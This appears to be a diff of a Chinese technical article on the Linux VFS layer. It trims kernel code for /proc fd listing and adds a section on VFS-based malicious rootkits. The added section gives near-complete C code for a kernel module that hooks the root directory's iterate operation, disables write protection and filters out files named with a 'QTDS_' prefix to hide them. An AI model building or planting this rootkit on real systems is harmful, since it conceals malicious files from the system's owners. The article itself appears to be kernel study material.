@@ -877,16 +877,13 @@ static int proc_readfd_common(struct file *file, struct dir_context *ctx,
 	struct files_struct *files;
 	unsigned int fd;
 
-	if (!p)
-		return -ENOENT;
-
-	if (!dir_emit_dots(file, ctx))
-		goto out;
+	......
 	files = get_files_struct(p);
 	if (!files)
 		goto out;
 
 	rcu_read_lock();
+	// 遍历指定进程的fdtable
 	for (fd = ctx->pos - 2;
 	     fd < files_fdtable(files)->max_fds;
 	     fd++, ctx->pos++) {
@@ -899,19 +896,12 @@ static int proc_readfd_common(struct file *file, struct dir_context *ctx,
 
 		len = snprintf(name, sizeof(name), "%u", fd);
 		//proc_fill_cache->dir_emit
-		if (!proc_fill_cache(file, ctx,
+		proc_fill_cache(file, ctx,
 				     name, len, instantiate, p,
-				     (void *)(unsigned long)fd))
-			goto out_fd_loop;
-		cond_resched();
-		rcu_read_lock();
+				     (void *)(unsigned long)fd)
+
 	}
-	rcu_read_unlock();
-out_fd_loop:
-	put_files_struct(files);
-out:
-	put_task_struct(p);
-	return 0;
+	......
 }
 ```
 
@@ -930,6 +920,77 @@ bool proc_fill_cache(struct file *file, struct dir_context *ctx,
 
 3、基于VFS层的恶意rootkit
 
+现在设想一个问题，如何基于LKM技术，通过VFS的`file_operations`做hook实现隐藏功能？一种可行的方案如下：
+
+-	对`iterate`/`iterate_shared`做hook，记为`fake_iterate`/`fake_iterate_shared`
+-	将`iterate`中`actor`设定为具有过滤指定name的`fake_filldir`
+-	`fake_filldir`本质上就是对原有VFS的`filldir`包裹一层逻辑，把要过滤掉的filename过滤掉，而对不需要过滤的filename直接透传原来的`filldir`正常处理返回即可
+
+伪代码如下：
+
+```CPP
+int (*real_iterate)(struct file *, struct dir_context *); 
+int (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+int fake_iterate(struct file *filp, struct dir_context *ctx)
+{
+    // 备份真正的filldir
+    real_filldir = ctx->actor;
+
+	// 替换掉dir_context的fill_dir
+    *(filldir_t *)&ctx->actor = fake_filldir;
+
+    return real_iterate(filp, ctx);
+}
+#define SECRET_FILE "QTDS_"
+int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
+             loff_t offset, u64 ino, unsigned d_type)
+{
+    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
+        // 如果是需要隐藏的文件，直接返回，不放入缓冲区
+        printk("Hiding: %s", name);
+        return 0;
+    }
+    // 如果不是需要隐藏的文件，交给的真正filldir处理
+    return real_filldir(ctx, name, namlen, offset, ino, d_type);
+}
+
+//set_f_op 用来替换某个目录下的iterate
+#define set_f_op(op, path, new, old)    \
+    do{                                 \
+        struct file *filp;              \
+        struct file_operations *f_op;   \
+        printk("Opening the path: %s.\n", path);    \
+        filp = filp_open(path, O_RDONLY, 0);        \
+        if(IS_ERR(filp)){                           \
+            printk("Failed to open %s with error %ld.\n",   \
+                path, PTR_ERR(filp));                       \
+            old = NULL;                                     \
+        }                                                   \
+        else{                                               \
+            printk("Succeeded in opening: %s.\n", path);    \
+            f_op = (struct file_operations *)filp->f_op;    \
+            old = f_op->op;                                 \
+            printk("Changing iterate from %p to %p.\n",     \
+                    old, new);                              \
+            disable_write_protection();                     \
+            f_op->op = new;                                 \
+            enable_write_protection();                      \
+        }                                                   \
+    }while(0)
+
+#define ROOT_PATH "/"
+// in init
+set_f_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
+
+if(!real_iterate){
+    return -ENOENT;
+}
+// in exit
+if(real_iterate){
+    void *dummy;
+    set_f_op(iterate, ROOT_PATH, real_iterate, dummy);
+}
+```
 
 ##	0x04	VFS的应用（项目相关）
 
